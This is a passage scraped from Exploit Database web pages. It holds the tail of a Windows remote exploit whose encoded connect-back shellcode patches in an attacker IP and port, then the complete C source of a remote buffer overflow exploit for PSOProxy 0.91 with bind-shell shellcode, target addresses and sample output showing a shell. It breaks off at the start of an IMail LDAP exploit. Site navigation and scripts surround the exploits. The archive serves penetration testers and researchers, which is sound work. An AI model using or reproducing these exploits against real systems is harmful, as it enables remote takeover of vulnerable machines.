*/"\x1e\x61\xc0\xc3\xf1\x34\xa5""\x95\x95\x95\x1e\xd5\x99\x1e\xe5\x89\x38\x1e\xfd\x9d\x7e\x95\x1e""\x50\xcb\xc8\x1c\x93\x6a\xa3\xfd\x1b\xdb\x9b\x79\x7d\x38\x95\x95""\x95\xfd\xa6\xa7\x95\x95\xfd\xe2\xe6\xa7\xca\xc1\x6a\x45\x1e\x6d""\xc2\xfd\x4c\x9c\x60\x38\x7d\x06\x95\x95\x95\xa6\x5c\xc4\xc4\xc4""\xc4\xd4\xc4\xd4\xc4\x6a\x45\x1c\xd3\xb1\xc2\xfd\x79\x6c\x3f\xf5""\x7d\xec\x95\x95\x95\xfd\xd4\xd4\xd4\xd4\xfd\xd7\xd7\xd7\xd7\x1e""\x59\xff\x85\xc4\x6a\xe3\xb1\x6a\x45\xfd\xf6\xf8\xf1\x95\x1c\xf3""\xa5\x6a\xa3\xfd\xe7\x6b\x26\x83\x7d\xc4\x95\x95\x95\x1c\xd3\x8b""\x16\x79\xc1\x18\xa9\xb1\xa6\x55\xa6\x5c\x16\x54\x80\x3e\x77\x68""\x53\xd1\xb1\x85\xd1\x6b\xd1\xb1\xa8\x6b\xd1\xb1\xa9\x1e\xd3\xb1""\x1c\xd1\xb1\xdd\x1c\xd1\xb1\xd9\x1c\xd1\xb1\xc5\x18\xd1\xb1\x85""\xc1\xc5\xc4\xc4\xc4\xff\x94\xc4\xc4\x6a\xe3\xa5\xc4\x6a\xc3\x8b""\x6a\xa3\xfd\x7a\x5b\x75\xf5\x7d\x97\x95\x95\x95\x6a\x45\xc6\xc0""\xc3\xc2\x1e\xf9\xb1\x8d\x1e\xd0\xa9\x1e\xc1\x90\xed\x96\x40\x1e""\xdf\x8d\x1e\xcf\xb5\x96\x48\x76\xa7\xdc\x1e\xa1\x1e\x96\x60\xa6""\x6a\x69\xa6\x55\x39\xaf\x51\xe1\x92\x54\x5a\x98\x96\x6d\x7e\x67""\xae\xe9\xb1\x81\xe0\x74\x1e\xcf\xb1\x96\x48\xf3\x1e\x99\xde\x1e""\xcf\x89\x96\x48\x1e\x91\x1e\x96\x50\x7e\x97\xa6\x55\x1e\x40\xca""\xcb\xc8\xce\x57\x91\x95";banner();if(argc!=4)syntax(argv[0]);host=inet_addr(argv[2])^0x95959595;port=atoi(argv[3]);if(port<=0||port>65535) {printf("error: <port> must be between 1 and 65535\r\n");return -1;}port=htons((unsigned short)port);port=port<<16;port+=0x0002;port=port^0x95959595;for(i=0;i<sizeof(shellc0de);i++) {if((unsigned char)shellc0de[i]==HOP&&(unsigned char)shellc0de[i+1]==HOP)if((unsigned char)shellc0de[i+2]==HOP&&(unsigned char)shellc0de[i+3]==HOP) {memcpy(&shellc0de[i],&host,4);host=0;}if((unsigned char)shellc0de[i]==POP&&(unsigned char)shellc0de[i+1]==POP)if((unsigned char)shellc0de[i+2]==POP&&(unsigned char)shellc0de[i+3]==POP) {memcpy(&shellc0de[i],&port,4);port=0;}}if(host||port) {printf("[i] error: unabled to find ip/port sequence in shellc0de\r\n");return -1;}if(WSAStartup(0x0101,&wsaData)!=0) {printf("[i] error: unable to load winsock\r\n");return -1;}printf("[-] Getting version through administration interface\r\n");sock=cnx(argv[1],ADMIN_PORT);if(!sock)printf("[i] warning: couldn't connect to admin int to get version, trying anyway\r\n");else {send(sock,"I'm a script kiddie\r\n",21,0);memset(buffer,0,sizeof(buffer));recv(sock,buffer,sizeof(buffer),0);memset(buffer,0,sizeof(buffer));recv(sock,buffer,sizeof(buffer),0);ptr=strstr(buffer,"GateKeeper@");if(!ptr)printf("[i] waring: version not found, trying anyway\r\n");else {ptr+=11;if(strncmp(ptr,VERSION,strlen(VERSION))) {printf("[i] error: wrong version\r\n");return -1;}printf("[i] %-44s ...OK\r\n","version");}}printf("[i] Starting to exploit\r\n");sock=cnx(argv[1],PORT);if(!sock)return -1;printf("[i] Preparing magic %-28s ...","packet");memset(useme,0x90,SIZE);memcpy(&useme[RET_POS-0x8ac],shellc0de,sizeof(shellc0de));*(unsigned long*)&useme[RET_POS] = RET_ADDR; // eip pointing to jmp ebx in exe memorymemcpy(&useme[RET_POS+12],"\xe9\xed\xf6\xff\xff",5); // jmp $ - 0x92cprintf("Done\r\n");printf("[i] Sending magic packet                         ...");send(sock,REQ,strlen(REQ),0);send(sock,useme,sizeof(useme),0);send(sock,REQ2,strlen(REQ2),0);printf("Done\r\n");closesocket(sock);return 0;}*================================= [Solutions] =================================*No solution, wait for Infopulse to read this advisory and release a patch.*================================= [Workaround] ================================*block undesired access to port 3128 (or uninstall the software and use a realproxy coded by real coders).*================================== [Credits] ==================================*Discovered and coded by Ivan Rodriguez Almuina <kralor@coromputer.net>*================================= [Disclaimer] ================================*The information within this paper may change without notice.Use of this information constitutes acceptance for use in an AS IS condition.There are NO warranties with to this information.In no event shall the author be liable for any damages whatsoever arising outof or in connection with the use or spread of this information.Any use of this information is at the user's own risk.*================================== [Feedback] =================================*Please send suggestions, updates, and comments to :irc : #coromputer on underneturl : http://www.coromputer.netmail : kralor@coromputer.net\*============================\* www.coromputer.net */===========================*/// milw0rm.com [2004-02-26]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 156
PSOProxy 0.91 (Windows 2000/XP) - Remote Buffer Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDPSOProxy 0.91 (Windows 2000/XP) - Remote Buffer OverflowEDB-ID:156CVE:2004-0313EDB Verified:Author:RaveType:remoteExploit:/Platform:WindowsDate:2004-02-26Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*Copyright © Rosiello Securityhttp www rosiello org================-== Remote Exploit for PSOProxy version v0.91 ==--Code by: raveContact: rave@rosiello.orgDate: Feb 2004Bug found by: Donato FerranteThere is a vulnerability found in the PSOProxy server.An attacker can execute arbitrary code exploiting remotely a buffer overflow.The exploit sends:GET / <1021 x A><adres of the shellcode><shellcode>This spawns a bindshell on the victim at port 28876..Usage <C:\>psoproxy-exploit.exe <target host> <target number>Target Number           Target Name                             Stack Adress=============           ===========                             ===========0                       Demo                                    0xBADC0DED1                       Windows XP Home Edtion SP1.             0x00D2FDDA2                       Windows XP Pro Edtion SP1.              0x00EDFDDC3                       Win2k Pro Edtion.                       0x00BBFDDC<C:\> psoproxy-exploit localhost 1[+] Winsock Inalized[+] Trying to connect to localhost:8080[+] socket inalized[+] Overflowing string is Prepared[+] Connected.[+] Overflowing string had been send<C:\> telnet localhost 28876Microsoft Windows XP [versie 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.<D:\>DO NOT USE THIS CODE ON DIFFERENT MACHINES BUT YOURS!!!Respect the law as we do!Special Tankz to:opy   { win2k 0wnage !! ty for lending me ur box }B0f   { Hope to work with u again in the futhure like we do all the time }Dragnet  { Always willing to help me out }Angelo  { Verry good maffio`so }Greetz go out to:Kajun  { Verry suportive guy }NrAziz { 0wns pakistan hax0r scene ! beware always say mr NrAziz }sloth  { good guy }Mercy  { Hope to see u soon }Netric security {www.netric.org/.de }[+] All the hax0rs i forgot.Hate Messages:Ziphie { U didnt get mine bitch }OOh and Li0n7 voila fr {you're doing it all wrong, your exploit doesn't work!http://www.securityfocus.com/archive/1/354769/2004-02-15/2004-02-21/0k/j man, keep on doing the good stuff and next time add some more stack adresses soit would work on other os`s...}Advisory at: http://www.rosiello.org/en/read_bugs.php?15*/#include <stdio.h>#include <winsock2.h>#include <errno.h>#include <windows.h>// Darn fucking 1337 macro shit#define ISIP(m) (!(inet_addr(m) ==-1))#define offset 1024 //1024struct remote_targets {char *os;unsigned long sh_addr;} target [] ={/* Option`s for your eyes only :D*/"Demo                        ",0xbadc0ded,"Windows XP Home Edtion SP1. ",0x00D2FDDA,"Windows XP Pro Edtion SP1.  ",0x00edfddc,"Win2k Pro Edtion.          ",0x00bbfddc,};//Bindcode spawns a binshell on port 28876 (Thanks to metasploit.com guys)unsigned char  shellcode[] ="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52""\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1""\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a""\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01""\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b""\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32""\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff""\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe""\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50""\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff""\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89""\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff""\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x60""\x6a\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x23\xff\xff\xff\x89""\xc6\x31\xdb\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x31\xdb\x56\x56""\x56\x53\x53\x31\xc0\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53""\x53\x53\x53\x6a\x44\x89\xe0\x53\x53\x53\x53\x54\x50\x53\x53\x53""\x43\x53\x4b\x53\x53\x51\x53\x87\xfd\xbb\x21\xd0\x05\xd0\xe8\xdf""\xfe\xff\xff\x5b\x31\xc0\x48\x50\x53\xbb\x43\xcb\x8d\x5f\xe8\xcf""\xfe\xff\xff\x56\x87\xef\xbb\x12\x6b\x6d\xd0\xe8\xc2\xfe\xff\xff""\x83\xc4\x5c\x61\xeb\x89\x41";// now what would this button do ?char *host_ip;u_long get_ip(char *hostname){struct  hostent    *hp;if (ISIP(hostname)) return inet_addr(hostname);if ((hp = gethostbyname(hostname))==NULL){ perror ("[+] gethostbyname() failed check the existance of the host.\n");exit(-1); }return (inet_ntoa(*((struct in_addr *)hp->h_addr)));}/// oooh yeah uuuh right ....int usage (char *what){int i;fprintf(stdout,"Copyright © Rosiello Security\n");fprintf(stdout,"http://www.rosiello.org\n\n");fprintf(stdout,"Usage %s <target host> <target number>\n",what);fprintf(stdout,"Target Number\t\tTarget Name\t\t\t\tStack Adress\n");fprintf(stdout,"=============\t\t===========\t\t\t\t===========\n");for (i=0;i < 4;i++)fprintf(stdout,"%d\t\t\t%s\t\t0x%p\n",i,target[i].os,target[i].sh_addr);exit(0);}int main(int argc,char **argv){char buffer[offset*2]="get /",*ptr,*address;int sd,oops,i,choise;struct  sockaddr_in  ooh;WSADATA wsadata;WSAStartup(0x101, &wsadata);if (argc < 2) usage(argv[0]);address=argv[1];choise=atoi(argv[2]);fprintf(stdout,"[+] Winsock Inalized\n");/* Lets start making a litle setupChange the port if you have to */ooh.sin_addr.s_addr = inet_addr(get_ip(address));ooh.sin_port        = htons(8080);ooh.sin_family      = AF_INET;fprintf(stdout,"[+] Trying to connect to %s:%d\n",address,8080);// ok ok here`s ur sock()sd = socket(AF_INET, SOCK_STREAM,IPPROTO_TCP);if (!sd<0) { fprintf(stderr,"[!] socket() failed.\n");exit (-1); }fprintf(stdout,"[+] socket inalized\n");/* initializing the expploiting buffer, read the file comments for the details */ptr=buffer+strlen(buffer);for (i=strlen(buffer);i < offset;i++) *ptr++=(char)0x2e;for (i=strlen(buffer);i < offset+6;i++) { *ptr++=(char)0xa; *ptr++=(char)0xd ;}memcpy(buffer+strlen(buffer),((char *)&shellcode),strlen(shellcode));memcpy(buffer+offset,((char *)&target[choise].sh_addr),3);fprintf(stdout,"[+] Overflowing string is Prepared\n");// Knock knock ... hi i want to hook up with youoops=connect(sd, (struct sockaddr *)&ooh, sizeof( ooh ));if(oops!=0) { fprintf(stderr,"[!] connect() failed.\n"); exit(-1); }// yep we are in :Dfprintf(stdout,"[+] Connected.\n");// Sending some Dangerous stuffi = send(sd,buffer,strlen(buffer),0);if (!i <0) { fprintf (stdout,"[!] Send() failed\n"); exit (-1) ; }fprintf(stdout,"[+] Overflowing string had been send\n");/* May psoproxy rest in peace (have cold a nice one and telnet to <host>  28876<C:\> telnet localhost 28876Microsoft Windows XP [versie 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.D:\>*/// the cleaners !!WSACleanup();// [EOF]return 0;}// milw0rm.com [2004-02-26]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 157
IPSwitch IMail LDAP Daemon/Service - Remote Buffer Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDIPSwitch IMail LDAP Daemon/Service - Remote Buffer OverflowEDB-ID:157CVE:2004-0297EDB Verified:Author:Johnny CyberpunkType:remoteExploit:/Platform:WindowsDate:2004-02-27Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/********************************************************//* THCimail 0.1 - Wind0wZ remote root exploit                                *//* Exploit by: Johnny Cyberpunk (jcyberpunk@thc.org)                     *//* THC PUBLIC SOURCE MATERIALS              